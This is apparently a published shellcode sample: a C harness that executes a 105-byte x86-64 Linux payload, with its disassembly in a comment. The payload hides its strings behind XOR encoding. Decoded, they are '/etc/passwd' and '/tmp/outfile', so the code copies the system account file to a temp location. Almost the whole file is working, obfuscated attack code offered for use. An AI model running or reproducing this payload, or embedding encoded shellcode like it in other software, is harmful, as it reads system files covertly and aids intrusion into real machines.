/*
    may 12 2019
    
    create by parth
    Tested on: Linux kali 4.19.0-4-amd64, x86_64 GNU/Linux
    Shellcode Length:  105

  0000000000000009 <decode>:
   9:	80 34 0f 32          	xor    BYTE PTR [rdi+rcx*1],0x32
   d:	e2 fa                	loop   9 <decode>
   f:	80 6f 0b 41          	sub    BYTE PTR [rdi+0xb],0x41
  13:	80 6f 18 41          	sub    BYTE PTR [rdi+0x18],0x41
  17:	6a 02                	push   0x2
  19:	58                   	pop    rax
  1a:	0f 05                	syscall 
  1c:	50                   	push   rax
  1d:	41 5e                	pop    r14
  1f:	48 83 c7 0c          	add    rdi,0xc
  23:	6a 66                	push   0x66
  25:	5e                   	pop    rsi
  26:	6a 02                	push   0x2
  28:	58                   	pop    rax
  29:	0f 05                	syscall 
  2b:	50                   	push   rax
  2c:	41 5f                	pop    r15
  2e:	48 31 c0             	xor    rax,rax
  31:	41 56                	push   r14
  33:	5f                   	pop    rdi
  34:	54                   	push   rsp
  35:	5e                   	pop    rsi
  36:	66 ba ff ff          	mov    dx,0xffff
  3a:	0f 05                	syscall 
  3c:	50                   	push   rax
  3d:	5a                   	pop    rdx
  3e:	41 57                	push   r15
  40:	5f                   	pop    rdi
  41:	6a 01                	push   0x1
  43:	58                   	pop    rax
  44:	0f 05                	syscall 
  46:	6a 3c                	push   0x3c
  48:	58                   	pop    rax
  49:	0f 05                	syscall  





*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xf6\xeb\x46\x5f\x6a\x18\x59\x80\x34\x0f\x32\xe2\xfa\x80\x6f\x0b\x41\x80\x6f\x18\x41\x6a\x02\x58\x0f\x05\x50\x41\x5e\x48\x83\xc7\x0c\x6a\x66\x5e\x6a\x02\x58\x0f\x05\x50\x41\x5f\x48\x31\xc0\x41\x56\x5f\x54\x5e\x66\xba\xff\xff\x0f\x05\x50\x5a\x41\x57\x5f\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xb5\xff\xff\xff\x2f\x57\x46\x51\x1d\x42\x53\x41\x41\x45\x56\x73\x1d\x46\x5f\x42\x1d\x5d\x47\x46\x54\x5b\x5e\x57\x73";


main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
